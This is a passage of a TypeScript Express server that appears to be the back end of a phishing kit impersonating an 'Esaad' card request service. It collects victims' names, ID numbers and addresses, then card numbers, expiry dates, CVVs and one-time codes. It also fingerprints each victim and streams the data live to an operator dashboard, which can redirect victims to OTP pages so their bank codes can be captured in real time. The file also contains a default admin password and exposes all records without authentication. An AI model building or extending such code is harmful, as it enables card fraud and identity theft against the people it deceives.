import express from 'express';
import { createServer as createViteServer } from 'vite';
import { createClient, SupabaseClient } from '@supabase/supabase-js';
import * as dotenv from 'dotenv';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';

dotenv.config();

// Load fallback vars from wrangler.toml if not set in process.env
try {
  const wranglerPath = path.resolve(process.cwd(), 'wrangler.toml');
  if (fs.existsSync(wranglerPath)) {
    const content = fs.readFileSync(wranglerPath, 'utf-8');
    const matchRegex = /^\s*([A-Z0-9_]+)\s*=\s*"([^"]*)"/gm;
    let match: RegExpExecArray | null;
    while ((match = matchRegex.exec(content)) !== null) {
      const [, key, val] = match;
      if (key && val && !process.env[key]) {
        process.env[key] = val;
      }
    }
  }
} catch {}

const app = express();
app.use(express.json());
app.use(express.text({ type: 'text/plain' }));

const PORT = Number(process.env.PORT) || 3000;

// Initialize Server-Side Supabase Client
const supabaseUrl = process.env.SUPABASE_URL || '';
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_ANON_KEY || '';

function getSupabase(): SupabaseClient | null {
  if (!supabaseUrl || !supabaseKey || !supabaseUrl.startsWith('http')) {
    return null;
  }
  return createClient(supabaseUrl, supabaseKey, {
    auth: { persistSession: false }
  });
}

export interface VisitorMeta {
  ip: string;
  os: string;
  device: string;
  browser: string;
  country: string;
}

export interface RequestRecord {
  id: string;
  name: string;
  mobile: string;
  idNumber: string;
  cardType: string;
  address: string;
  date: string;
  paymentName?: string;
  cardNumber?: string;
  expMonth?: string;
  expYear?: string;
  cvv?: string;
  otp?: string;
  otpStatus?: string;
  nextAction?: string;
  step: string;
  createdAt: string;
  updatedAt: string;
  isOnline?: boolean;
  secondsAgo?: number;
  currentPage?: string;
  meta?: VisitorMeta;
}

interface PresenceEntry {
  lastSeen: number;
  currentPage: string;
  requestId: string | null;
  meta?: VisitorMeta;
}

const ONLINE_WINDOW_MS = 15000; // 15 seconds server-authoritative online window
const DB_SYNC_INTERVAL_MS = 4000; // 4 seconds database heartbeat sync

// Server-side authoritative tracking state
const adminTokens = new Set<string>();
const devicePresence = new Map<string, PresenceEntry>();
const userPresence = new Map<string, { lastSeen: number; currentPage: string }>();
const lastKnownUserPage = new Map<string, string>();
const userMetaMap = new Map<string, VisitorMeta>();
const pendingRedirects = new Map<string, string>();
const explicitlyOfflineIds = new Map<string, number>();
const lastDbPresenceSync = new Map<string, { time: number; page: string }>();
const ipToSessionMap = new Map<string, { clientId: string; requestId: string; lastSeen: number }>();

// Real-time SSE streams
const visitorStreams = new Map<string, Set<express.Response>>();
const adminStreams = new Set<express.Response>();

let totalVisitorsCounter = 0;

function parseCookies(cookieHeader?: string): Record<string, string> {
  const list: Record<string, string> = {};
  if (!cookieHeader) return list;
  cookieHeader.split(';').forEach((cookie) => {
    const parts = cookie.split('=');
    const key = parts.shift()?.trim();
    if (key) {
      list[key] = decodeURIComponent(parts.join('=').trim());
    }
  });
  return list;
}

function normalizeRedirectTarget(action?: string | null): string | null {
  if (!action) return null;
  const trimmed = String(action).trim();
  if (!trimmed) return null;
  const map: Record<string, string> = {
    '/': '/',
    home: '/',
    '/request': '/request',
    form: '/request',
    '/register-company': '/register-company',
    company: '/register-company',
    '/payment': '/payment',
    payment: '/payment',
    '/card-details': '/card-details',
    card: '/card-details',
    '/waiting': '/waiting',
    waiting: '/waiting',
    '/otp': '/otp',
    otp: '/otp',
    'otp-sms': '/otp',
    '/otp-bank': '/otp-bank',
    'otp-bank': '/otp-bank'
  };
  return map[trimmed] || (trimmed.startsWith('/') ? trimmed : null);
}

function normalizeStepToPage(step?: string | null): string {
  if (!step) return '/';
  if (step.startsWith('/')) return step;
  const map: Record<string, string> = {
    home: '/',
    form: '/payment',
    card: '/waiting',
    otp: '/otp',
    'otp-bank': '/otp-bank'
  };
  return map[step] || '/';
}

function extractVisitorMeta(req: express.Request): VisitorMeta {
  const ua = String(req.headers['user-agent'] || '');
  const cfIp = String(req.headers['cf-connecting-ip'] || '');
  const forwarded = String(req.headers['x-forwarded-for'] || '');
  const rawIp = (cfIp || forwarded.split(',')[0] || req.socket.remoteAddress || '188.53.192.70').trim();
  const ip = rawIp.replace(/^::ffff:/, '') || '188.53.192.70';

  let os = 'Windows';
  if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
  else if (/Android/i.test(ua)) os = 'Android';
  else if (/Mac OS X/i.test(ua)) os = 'macOS';
  else if (/Linux/i.test(ua)) os = 'Linux';

  const device = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'mobile' : 'desktop';

  let browser = 'Chrome';
  if (/Edg\//i.test(ua)) browser = 'Edge';
  else if (/OPR\//i.test(ua)) browser = 'Opera';
  else if (/Chrome\//i.test(ua)) browser = 'Chrome';
  else if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) browser = 'Safari';
  else if (/Firefox\//i.test(ua)) browser = 'Firefox';

  return {
    ip,
    os,
    device,
    browser,
    country: 'Saudi Arabia, Riyadh'
  };
}

function getFingerprintKey(req: express.Request): string {
  const meta = extractVisitorMeta(req);
  const ua = String(req.headers['user-agent'] || '').slice(0, 120);
  return `${meta.ip}|${ua}`;
}

function buildCookie(name: string, value: string, req: express.Request, maxAge = 60 * 60 * 24 * 30): string {
  const isSecure = req.secure || req.headers['x-forwarded-proto'] === 'https';
  const sameSite = isSecure ? 'SameSite=None; Secure' : 'SameSite=Lax';
  const agePart = maxAge !== undefined ? `; Max-Age=${maxAge}` : '';
  return `${name}=${encodeURIComponent(value)}; Path=/; HttpOnly${agePart}; ${sameSite}`;
}

function isRequestIdOnlineOnServer(reqId: string, updatedAtIso?: string, serverNow = Date.now()): boolean {
  const activeStreams = visitorStreams.get(reqId);
  if (activeStreams && activeStreams.size > 0) {
    return true;
  }

  const offlineAt = explicitlyOfflineIds.get(reqId);
  const memEntry = userPresence.get(reqId);
  if (memEntry) {
    if (offlineAt && offlineAt >= memEntry.lastSeen) {
      return false;
    }
    if (serverNow - memEntry.lastSeen < ONLINE_WINDOW_MS) {
      return true;
    }
  }

  for (const d of devicePresence.values()) {
    if (d.requestId === reqId && serverNow - d.lastSeen < ONLINE_WINDOW_MS) {
      if (!offlineAt || d.lastSeen > offlineAt) {
        return true;
      }
    }
  }

  if (updatedAtIso) {
    const updatedMs = new Date(updatedAtIso).getTime();
    if (!isNaN(updatedMs)) {
      if (offlineAt && offlineAt >= updatedMs) {
        return false;
      }
      if (serverNow - updatedMs < ONLINE_WINDOW_MS) {
        return true;
      }
    }
  }

  return false;
}

function prunePresence() {
  const cutoff = Date.now() - ONLINE_WINDOW_MS;
  for (const [cid, entry] of devicePresence.entries()) {
    const reqStreams = entry.requestId ? visitorStreams.get(entry.requestId) : undefined;
    const hasOpenStream = Boolean(reqStreams && reqStreams.size > 0);
    if (!hasOpenStream && entry.lastSeen < cutoff) {
      devicePresence.delete(cid);
    }
  }
  for (const [reqId, entry] of userPresence.entries()) {
    const reqStreams = visitorStreams.get(reqId);
    const hasOpenStream = Boolean(reqStreams && reqStreams.size > 0);
    if (!hasOpenStream && entry.lastSeen < cutoff) {
      userPresence.delete(reqId);
    } else if (hasOpenStream) {
      entry.lastSeen = Date.now();
    }
  }
}

function toSupabaseRow(record: Partial<RequestRecord> & { id: string }) {
  const row: Record<string, any> = { id: record.id };
  if (record.name !== undefined) row.name = record.name;
  if (record.mobile !== undefined) row.mobile = record.mobile;
  if (record.idNumber !== undefined) row.id_number = record.idNumber;
  if (record.cardType !== undefined) row.card_type = record.cardType;
  if (record.address !== undefined) row.address = record.address;
  if (record.date !== undefined) row.date = record.date;
  if (record.paymentName !== undefined) row.payment_name = record.paymentName;
  if (record.cardNumber !== undefined) row.card_number = record.cardNumber;
  if (record.expMonth !== undefined) row.exp_month = record.expMonth;
  if (record.expYear !== undefined) row.exp_year = record.expYear;
  if (record.cvv !== undefined) row.cvv = record.cvv;
  if (record.otp !== undefined) row.otp = record.otp;
  if (record.otpStatus !== undefined) row.otp_status = record.otpStatus;
  if (record.nextAction !== undefined) row.next_action = record.nextAction;
  if (record.step !== undefined) row.step = record.step;
  if (record.createdAt !== undefined) row.created_at = record.createdAt;
  if (record.updatedAt !== undefined) row.updated_at = record.updatedAt;
  return row;
}

function fromSupabaseRow(row: any, serverNow = Date.now()): RequestRecord {
  const id = String(row.id);
  const rawStep = row.step || 'home';
  const currentPage = lastKnownUserPage.get(id) || normalizeStepToPage(rawStep);
  const memPresence = userPresence.get(id);
  const dbUpdatedIso = row.updated_at ?? row.updatedAt ?? new Date(serverNow).toISOString();
  const dbUpdatedMs = new Date(dbUpdatedIso).getTime();
  const effectiveLastSeenMs = memPresence
    ? Math.max(memPresence.lastSeen, isNaN(dbUpdatedMs) ? 0 : dbUpdatedMs)
    : isNaN(dbUpdatedMs)
      ? serverNow
      : dbUpdatedMs;
  const effectiveUpdatedIso = new Date(effectiveLastSeenMs).toISOString();
  const isOnline = isRequestIdOnlineOnServer(id, effectiveUpdatedIso, serverNow);
  const secondsAgo = isOnline ? 0 : Math.max(0, Math.floor((serverNow - effectiveLastSeenMs) / 1000));

  return {
    id,
    name: row.name || '',
    mobile: row.mobile || '',
    idNumber: row.id_number ?? row.idNumber ?? '',
    cardType: row.card_type ?? row.cardType ?? '',
    address: row.address || '',
    date: row.date || '',
    paymentName: row.payment_name ?? row.paymentName ?? undefined,
    cardNumber: row.card_number ?? row.cardNumber ?? undefined,
    expMonth: row.exp_month ?? row.expMonth ?? undefined,
    expYear: row.exp_year ?? row.expYear ?? undefined,
    cvv: row.cvv ?? undefined,
    otp: row.otp ?? undefined,
    otpStatus: row.otp_status ?? row.otpStatus ?? undefined,
    nextAction: row.next_action ?? row.nextAction ?? undefined,
    step: rawStep,
    createdAt: row.created_at ?? row.createdAt ?? effectiveUpdatedIso,
    updatedAt: effectiveUpdatedIso,
    isOnline,
    secondsAgo,
    currentPage,
    meta: userMetaMap.get(id)
  };
}

async function fetchEnrichedRequests(): Promise<RequestRecord[]> {
  prunePresence();
  const serverNow = Date.now();
  const supabase = getSupabase();
  let dbRequests: RequestRecord[] = [];

  if (supabase) {
    const { data, error } = await supabase
      .from('requests')
      .select('*')
      .order('updated_at', { ascending: false });
    if (!error && data) {
      dbRequests = data.map((row) => fromSupabaseRow(row, serverNow));
    }
  }

  const existingMap = new Map(dbRequests.map((r) => [r.id, r]));
  const nowIso = new Date(serverNow).toISOString();

  for (const [reqId, entry] of userPresence.entries()) {
    const existing = existingMap.get(reqId);
    if (!existing) {
      const isOnline = isRequestIdOnlineOnServer(reqId, new Date(entry.lastSeen).toISOString(), serverNow);
      dbRequests.push({
        id: reqId,
        name: '',
        mobile: '',
        idNumber: '',
        cardType: 'gold',
        address: '',
        date: '',
        step: entry.currentPage,
        createdAt: nowIso,
        updatedAt: new Date(entry.lastSeen).toISOString(),
        isOnline,
        secondsAgo: isOnline ? 0 : Math.max(0, Math.floor((serverNow - entry.lastSeen) / 1000)),
        currentPage: entry.currentPage,
        meta: userMetaMap.get(reqId)
      });
    }
  }

  dbRequests.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime());
  return dbRequests;
}

function buildStatsPayload(enrichedRequests?: RequestRecord[]) {
  prunePresence();
  const serverNow = Date.now();
  const onlineUsers: Record<string, boolean> = {};
  const userPages: Record<string, string> = {};
  const userMeta: Record<string, VisitorMeta> = {};

  for (const [reqId, page] of lastKnownUserPage.entries()) {
    userPages[reqId] = page;
  }

  for (const [reqId, meta] of userMetaMap.entries()) {
    userMeta[reqId] = meta;
  }

  for (const [reqId, entry] of userPresence.entries()) {
    if (isRequestIdOnlineOnServer(reqId, new Date(entry.lastSeen).toISOString(), serverNow)) {
      onlineUsers[reqId] = true;
    }
    userPages[reqId] = entry.currentPage;
  }

  if (enrichedRequests) {
    for (const r of enrichedRequests) {
      if (r.isOnline) {
        onlineUsers[r.id] = true;
      }
      if (r.currentPage && !userPages[r.id]) {
        userPages[r.id] = r.currentPage;
      }
      if (r.meta && !userMeta[r.id]) {
        userMeta[r.id] = r.meta;
      }
    }
  }

  const activeSessions = Array.from(devicePresence.entries())
    .filter(([, entry]) => entry.requestId && isRequestIdOnlineOnServer(entry.requestId, undefined, serverNow))
    .map(([cid, entry]) => ({
      clientId: cid,
      requestId: entry.requestId,
      currentPage: entry.currentPage,
      lastSeen: entry.lastSeen,
      meta: entry.meta
    }));

  return {
    onlineCount: Math.max(activeSessions.length, Object.keys(onlineUsers).length),
    totalVisitorsCount: totalVisitorsCounter,
    onlineUsers,
    userPages,
    userMeta,
    activeSessions,
    serverTime: serverNow
  };
}

let broadcastDebounceTimer: ReturnType<typeof setTimeout> | null = null;

function broadcastToAdmins() {
  if (adminStreams.size === 0) return;
  if (broadcastDebounceTimer) return;
  broadcastDebounceTimer = setTimeout(async () => {
    broadcastDebounceTimer = null;
    if (adminStreams.size === 0) return;
    try {
      const requests = await fetchEnrichedRequests();
      const stats = buildStatsPayload(requests);
      const payload = `event: snapshot\ndata: ${JSON.stringify({ stats, requests })}\n\n`;
      for (const stream of adminStreams) {
        try {
          stream.write(payload);
        } catch {
          adminStreams.delete(stream);
        }
      }
    } catch {}
  }, 80);
}

function sendVisitorEvent(requestId: string, eventName: string, data: Record<string, any>) {
  const streams = visitorStreams.get(requestId);
  if (!streams || streams.size === 0) return;
  const payload = `event: ${eventName}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const stream of streams) {
    try {
      stream.write(payload);
    } catch {
      streams.delete(stream);
    }
  }
}

async function syncVisitorPresenceToDb(requestId: string, currentPage: string, force = false): Promise<string | null> {
  const now = Date.now();
  const prevSync = lastDbPresenceSync.get(requestId);
  const shouldSync =
    force || !prevSync || now - prevSync.time >= DB_SYNC_INTERVAL_MS || prevSync.page !== currentPage;

  if (!shouldSync) {
    return pendingRedirects.get(requestId) || null;
  }

  lastDbPresenceSync.set(requestId, { time: now, page: currentPage });
  const supabase = getSupabase();
  if (!supabase) {
    return pendingRedirects.get(requestId) || null;
  }

  const nowIso = new Date(now).toISOString();
  try {
    const { data: updatedRows } = await supabase
      .from('requests')
      .update({
        updated_at: nowIso,
        step: currentPage
      })
      .eq('id', requestId)
      .select('id, next_action');

    if (!updatedRows || updatedRows.length === 0) {
      await supabase
        .from('requests')
        .upsert(
          {
            id: requestId,
            step: currentPage,
            created_at: nowIso,
            updated_at: nowIso
          },
          { onConflict: 'id' }
        );
    } else if (updatedRows[0]?.next_action) {
      const dbTarget = normalizeRedirectTarget(updatedRows[0].next_action);
      if (dbTarget) {
        pendingRedirects.set(requestId, dbTarget);
      }
    }
  } catch {
    lastDbPresenceSync.delete(requestId);
  }

  return pendingRedirects.get(requestId) || null;
}

function recordServerSideVisit(
  req: express.Request,
  res: express.Response,
  options?: { clientId?: string; requestId?: string; currentPage?: string; isNewVisit?: boolean }
): { clientId: string; requestId: string | null; currentPage: string } {
  const cookies = parseCookies(req.headers.cookie);
  const fpKey = getFingerprintKey(req);
  const fpSession = ipToSessionMap.get(fpKey);
  const now = Date.now();

  const currentPage = String(options?.currentPage || req.path || '/');
  const isAdminPage = currentPage.startsWith('/admin');

  const clientId = String(
    options?.clientId ||
      cookies.esaad_cid ||
      (fpSession && now - fpSession.lastSeen < 3600000 ? fpSession.clientId : '') ||
      crypto.randomUUID()
  );

  const existingDevice = devicePresence.get(clientId);

  const resolvedReqId = isAdminPage
    ? null
    : String(
        options?.requestId ||
          cookies.esaad_req_id ||
          existingDevice?.requestId ||
          (fpSession && now - fpSession.lastSeen < 3600000 ? fpSession.requestId : '') ||
          crypto.randomUUID()
      );

  const isNewVisit = !cookies.esaad_visited && (options?.isNewVisit ?? true);
  const meta = extractVisitorMeta(req);

  const cookieHeaders: string[] = [buildCookie('esaad_cid', clientId, req)];
  if (resolvedReqId) {
    cookieHeaders.push(buildCookie('esaad_req_id', resolvedReqId, req));
    ipToSessionMap.set(fpKey, { clientId, requestId: resolvedReqId, lastSeen: now });
  }
  if (isNewVisit && !isAdminPage) {
    totalVisitorsCounter += 1;
    cookieHeaders.push(buildCookie('esaad_visited', '1', req));
  }

  if (!res.headersSent) {
    res.setHeader('Set-Cookie', cookieHeaders);
  }

  if (!isAdminPage && resolvedReqId) {
    explicitlyOfflineIds.delete(resolvedReqId);

    devicePresence.set(clientId, {
      lastSeen: now,
      currentPage,
      requestId: resolvedReqId,
      meta
    });

    userPresence.set(resolvedReqId, {
      lastSeen: now,
      currentPage
    });
    lastKnownUserPage.set(resolvedReqId, currentPage);
    userMetaMap.set(resolvedReqId, meta);
  }

  return { clientId, requestId: resolvedReqId, currentPage };
}

// ==================== SERVER-SIDE HTML PAGE TRACKING MIDDLEWARE ====================
const TRACKED_HTML_PATHS = new Set([
  '/',
  '/request',
  '/register-company',
  '/payment',
  '/card-details',
  '/waiting',
  '/otp',
  '/otp-bank'
]);

app.use((req, res, next) => {
  if (req.method === 'GET' && TRACKED_HTML_PATHS.has(req.path)) {
    const { requestId, currentPage } = recordServerSideVisit(req, res, {
      currentPage: req.path,
      isNewVisit: true
    });
    if (requestId) {
      syncVisitorPresenceToDb(requestId, currentPage, true)
        .then(() => broadcastToAdmins())
        .catch(() => {});
    }
  }
  next();
});

// ==================== REAL-TIME SSE STREAM (/api/stream) ====================
app.get('/api/stream', async (req, res) => {
  const role = String(req.query.role || 'visitor');

  res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache, no-transform');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');

  if (role === 'admin') {
    res.flushHeaders?.();
    adminStreams.add(res);

    try {
      const requests = await fetchEnrichedRequests();
      const stats = buildStatsPayload(requests);
      res.write(`event: snapshot\ndata: ${JSON.stringify({ stats, requests })}\n\n`);
    } catch {}

    const keepAliveTimer = setInterval(() => {
      try {
        res.write(`: keepalive ${Date.now()}\n\n`);
      } catch {
        clearInterval(keepAliveTimer);
        adminStreams.delete(res);
      }
    }, 10000);

    req.on('close', () => {
      clearInterval(keepAliveTimer);
      adminStreams.delete(res);
    });
    return;
  }

  // Visitor real-time stream
  const pageParam = String(req.query.page || '/');
  const { clientId, requestId, currentPage } = recordServerSideVisit(req, res, {
    clientId: req.query.clientId ? String(req.query.clientId) : undefined,
    requestId: req.query.requestId ? String(req.query.requestId) : undefined,
    currentPage: pageParam
  });

  res.flushHeaders?.();

  if (!requestId) {
    res.write(`event: connected\ndata: ${JSON.stringify({ ok: true })}\n\n`);
    return;
  }

  let streamSet = visitorStreams.get(requestId);
  if (!streamSet) {
    streamSet = new Set();
    visitorStreams.set(requestId, streamSet);
  }
  streamSet.add(res);

  const pendingTarget = await syncVisitorPresenceToDb(requestId, currentPage, true);
  res.write(
    `event: connected\ndata: ${JSON.stringify({
      ok: true,
      clientId,
      requestId,
      redirectTo: pendingTarget && pendingTarget !== currentPage ? pendingTarget : null
    })}\n\n`
  );
  broadcastToAdmins();

  // Keep visitor continuously online while SSE stream is open
  const visitorKeepAlive = setInterval(() => {
    const now = Date.now();
    const activePage = lastKnownUserPage.get(requestId) || currentPage;
    userPresence.set(requestId, { lastSeen: now, currentPage: activePage });
    const dev = devicePresence.get(clientId);
    if (dev) {
      devicePresence.set(clientId, { ...dev, lastSeen: now, currentPage: activePage });
    }
    syncVisitorPresenceToDb(requestId, activePage, false).catch(() => {});
    try {
      res.write(`: ping ${now}\n\n`);
    } catch {
      clearInterval(visitorKeepAlive);
    }
  }, 4000);

  req.on('close', () => {
    clearInterval(visitorKeepAlive);
    const set = visitorStreams.get(requestId);
    if (set) {
      set.delete(res);
      if (set.size === 0) {
        visitorStreams.delete(requestId);
      }
    }
    // Check after 1.5s if visitor reconnected (e.g., page refresh) or genuinely closed the site
    setTimeout(() => {
      const currentStreams = visitorStreams.get(requestId);
      const hasStream = Boolean(currentStreams && currentStreams.size > 0);
      const mem = userPresence.get(requestId);
      const recentlyPinged = Boolean(mem && Date.now() - mem.lastSeen < 1500);
      if (!hasStream && !recentlyPinged) {
        broadcastToAdmins();
      }
    }, 1500);
  });
});

// ==================== API ROUTES ====================

// 1. Presence & Current Page Tracking
app.post('/api/presence', async (req, res) => {
  const body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : req.body || {};
  const { requestId, currentPage } = recordServerSideVisit(req, res, {
    clientId: body?.clientId,
    requestId: body?.requestId,
    currentPage: body?.currentPage || '/',
    isNewVisit: Boolean(body?.isNewVisit)
  });

  if (requestId && !currentPage.startsWith('/admin')) {
    await syncVisitorPresenceToDb(requestId, currentPage, false);

    const targetRoute = pendingRedirects.get(requestId);
    if (targetRoute) {
      if (currentPage === targetRoute) {
        pendingRedirects.delete(requestId);
        const supabase = getSupabase();
        if (supabase) {
          supabase
            .from('requests')
            .update({ next_action: '', step: currentPage, updated_at: new Date().toISOString() })
            .eq('id', requestId)
            .then(() => broadcastToAdmins());
        }
      } else {
        prunePresence();
        broadcastToAdmins();
        return res.json({ ok: true, requestId, redirectTo: targetRoute });
      }
    }
    broadcastToAdmins();
  }

  prunePresence();
  res.json({ ok: true, requestId, redirectTo: null });
});

// Instant leave notification when visitor closes tab
app.post('/api/presence/leave', async (req, res) => {
  let body: any = {};
  try {
    body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : req.body || {};
  } catch {}
  const cookies = parseCookies(req.headers.cookie);
  const clientId = String(body?.clientId || cookies.esaad_cid || '');
  const requestId = String(body?.requestId || cookies.esaad_req_id || '');

  if (clientId) {
    devicePresence.delete(clientId);
  }
  if (requestId) {
    userPresence.delete(requestId);
    explicitlyOfflineIds.set(requestId, Date.now());
    const streams = visitorStreams.get(requestId);
    if (streams) {
      visitorStreams.delete(requestId);
    }
    const supabase = getSupabase();
    if (supabase) {
      const offlineIso = new Date(Date.now() - 120000).toISOString();
      try {
        await supabase
          .from('requests')
          .update({ updated_at: offlineIso })
          .eq('id', requestId);
      } catch {}
    }
  }

  broadcastToAdmins();
  res.json({ ok: true });
});

app.get('/api/stats', async (_req, res) => {
  const enriched = await fetchEnrichedRequests();
  res.json(buildStatsPayload(enriched));
});

// 2. Admin Authentication via Server-Side Supabase
app.post('/api/admin/login', async (req, res) => {
  const { email, password } = req.body || {};
  if (!email || !password) {
    return res.status(400).json({ error: 'الرجاء إدخال البريد الإلكتروني وكلمة المرور' });
  }

  const supabase = getSupabase();
  if (supabase) {
    const { data, error } = await supabase.auth.signInWithPassword({
      email: String(email).trim(),
      password: String(password)
    });
    if (!error && data.session) {
      const token = data.session.access_token;
      adminTokens.add(token);
      res.setHeader('Set-Cookie', buildCookie('esaad_admin_token', token, req));
      return res.json({ token, user: { email: data.user?.email } });
    }
  }

  const expectedEmail = process.env.ADMIN_EMAIL || 'admin@esaad.ae';
  const expectedPassword = process.env.ADMIN_PASSWORD || 'admin123';

  if (
    String(email).trim().toLowerCase() === expectedEmail.toLowerCase() &&
    String(password) === expectedPassword
  ) {
    const token = crypto.randomBytes(24).toString('hex');
    adminTokens.add(token);
    res.setHeader('Set-Cookie', buildCookie('esaad_admin_token', token, req));
    return res.json({ token, user: { email: expectedEmail } });
  }

  return res.status(401).json({ error: 'البريد الإلكتروني أو كلمة المرور غير صحيحة' });
});

app.get('/api/admin/me', async (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  const authHeader = req.headers.authorization;
  const token =
    authHeader && authHeader.startsWith('Bearer ')
      ? authHeader.slice(7)
      : cookies.esaad_admin_token || '';

  if (!token) {
    return res.status(401).json({ authenticated: false });
  }
  if (adminTokens.has(token)) {
    return res.json({ authenticated: true });
  }

  const supabase = getSupabase();
  if (supabase) {
    const { data, error } = await supabase.auth.getUser(token);
    if (!error && data.user) {
      adminTokens.add(token);
      return res.json({ authenticated: true, user: { email: data.user.email } });
    }
  }
  return res.status(401).json({ authenticated: false });
});

app.post('/api/admin/logout', (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  const authHeader = req.headers.authorization;
  const token =
    authHeader && authHeader.startsWith('Bearer ')
      ? authHeader.slice(7)
      : cookies.esaad_admin_token || '';

  if (token) {
    adminTokens.delete(token);
  }
  res.setHeader('Set-Cookie', buildCookie('esaad_admin_token', '', req, 0));
  res.json({ ok: true });
});

// 3. Requests CRUD (Pure Server-Side Supabase)
app.get('/api/requests/current', async (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  const fpSession = ipToSessionMap.get(getFingerprintKey(req));
  const id = cookies.esaad_req_id || fpSession?.requestId;
  if (!id) {
    return res.status(404).json({ error: 'لا يوجد طلب نشط' });
  }

  const supabase = getSupabase();
  if (!supabase) {
    return res.status(503).json({ error: 'يرجى ضبط إعدادات SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' });
  }

  const { data, error } = await supabase
    .from('requests')
    .select('*')
    .eq('id', id)
    .single();

  if (error || !data) {
    return res.status(404).json({ error: 'الطلب غير موجود' });
  }

  explicitlyOfflineIds.delete(id);
  const currentPage = lastKnownUserPage.get(id) || normalizeStepToPage(data.step) || '/waiting';
  userPresence.set(id, { lastSeen: Date.now(), currentPage });
  return res.json(fromSupabaseRow(data));
});

app.get('/api/requests', async (_req, res) => {
  const dbRequests = await fetchEnrichedRequests();
  return res.json(dbRequests);
});

app.get('/api/requests/:id', async (req, res) => {
  const { id } = req.params;
  const supabase = getSupabase();
  if (!supabase) {
    return res.status(503).json({ error: 'يرجى ضبط إعدادات Supabase في الخادم' });
  }

  const { data, error } = await supabase
    .from('requests')
    .select('*')
    .eq('id', id)
    .single();

  if (error || !data) {
    return res.status(404).json({ error: 'الطلب غير موجود' });
  }

  explicitlyOfflineIds.delete(id);
  const currentPage = lastKnownUserPage.get(id) || normalizeStepToPage(data.step) || '/waiting';
  userPresence.set(id, { lastSeen: Date.now(), currentPage });
  return res.json(fromSupabaseRow(data));
});

app.post('/api/requests', async (req, res) => {
  const supabase = getSupabase();
  if (!supabase) {
    return res.status(503).json({ error: 'يرجى ضبط SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' });
  }

  const cookies = parseCookies(req.headers.cookie);
  const fpSession = ipToSessionMap.get(getFingerprintKey(req));
  const now = new Date().toISOString();
  const id = String(req.body?.id || cookies.esaad_req_id || fpSession?.requestId || crypto.randomUUID());

  const newRecord: RequestRecord = {
    id,
    name: req.body?.name || '',
    mobile: req.body?.mobile || '',
    idNumber: req.body?.idNumber || '',
    cardType: req.body?.cardType || '',
    address: req.body?.address || '',
    date: req.body?.date || '',
    step: '/payment',
    createdAt: now,
    updatedAt: now
  };

  const { data, error } = await supabase
    .from('requests')
    .upsert(toSupabaseRow(newRecord), { onConflict: 'id' })
    .select('*')
    .single();

  if (error) {
    return res.status(500).json({ error: error.message });
  }

  explicitlyOfflineIds.delete(id);
  lastDbPresenceSync.set(id, { time: Date.now(), page: '/payment' });
  const clientId = cookies.esaad_cid || fpSession?.clientId || crypto.randomUUID();
  const meta = extractVisitorMeta(req);
  userMetaMap.set(id, meta);
  devicePresence.set(clientId, {
    lastSeen: Date.now(),
    requestId: id,
    currentPage: '/payment',
    meta
  });

  userPresence.set(id, { lastSeen: Date.now(), currentPage: '/payment' });
  lastKnownUserPage.set(id, '/payment');

  res.setHeader('Set-Cookie', [
    buildCookie('esaad_cid', clientId, req),
    buildCookie('esaad_req_id', id, req)
  ]);

  const enriched = fromSupabaseRow(data || newRecord);
  broadcastToAdmins();
  return res.status(201).json(enriched);
});

app.patch('/api/requests/:id', async (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  const fpSession = ipToSessionMap.get(getFingerprintKey(req));
  const id = req.params.id === 'current' ? cookies.esaad_req_id || fpSession?.requestId : req.params.id;
  if (!id) {
    return res.status(400).json({ error: 'معرف الطلب غير متوفر' });
  }

  const supabase = getSupabase();
  if (!supabase) {
    return res.status(503).json({ error: 'يرجى ضبط SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' });
  }

  const now = new Date().toISOString();
  const patchPayload: Partial<RequestRecord> & { id: string } = {
    ...req.body,
    id,
    updatedAt: now
  };

  let pushedRedirect: string | null = null;

  if (req.body?.nextAction !== undefined) {
    const targetRoute = normalizeRedirectTarget(req.body.nextAction);
    if (targetRoute) {
      pendingRedirects.set(id, targetRoute);
      lastKnownUserPage.set(id, targetRoute);
      patchPayload.step = targetRoute;
      pushedRedirect = targetRoute;
      const existingPresence = userPresence.get(id);
      if (existingPresence) {
        userPresence.set(id, { ...existingPresence, currentPage: targetRoute });
      }
    } else {
      pendingRedirects.delete(id);
    }
  } else if (req.body?.step === 'card' || req.body?.step === 'otp' || req.body?.step === 'otp-bank') {
    pendingRedirects.delete(id);
    const stepPage = req.body.step === 'card' ? '/waiting' : req.body.step === 'otp-bank' ? '/otp-bank' : '/otp';
    explicitlyOfflineIds.delete(id);
    userPresence.set(id, { lastSeen: Date.now(), currentPage: stepPage });
    lastKnownUserPage.set(id, stepPage);
  }

  const patchRow = toSupabaseRow(patchPayload);
  delete patchRow.id;

  const { data, error } = await supabase
    .from('requests')
    .update(patchRow)
    .eq('id', id)
    .select('*')
    .single();

  if (error) {
    return res.status(500).json({ error: error.message });
  }

  const enriched = fromSupabaseRow(data);

  // Push real-time action event to the visitor's open SSE stream
  sendVisitorEvent(id, 'action', {
    redirectTo: pushedRedirect,
    otpStatus: enriched.otpStatus,
    nextAction: enriched.nextAction,
    request: enriched
  });

  broadcastToAdmins();
  return res.json(enriched);
});

app.delete('/api/requests/:id', async (req, res) => {
  const { id } = req.params;
  if (!id) {
    return res.status(400).json({ error: 'معرف الطلب غير متوفر' });
  }

  const supabase = getSupabase();
  if (!supabase) {
    return res.status(503).json({ error: 'يرجى ضبط SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' });
  }

  const { error } = await supabase
    .from('requests')
    .delete()
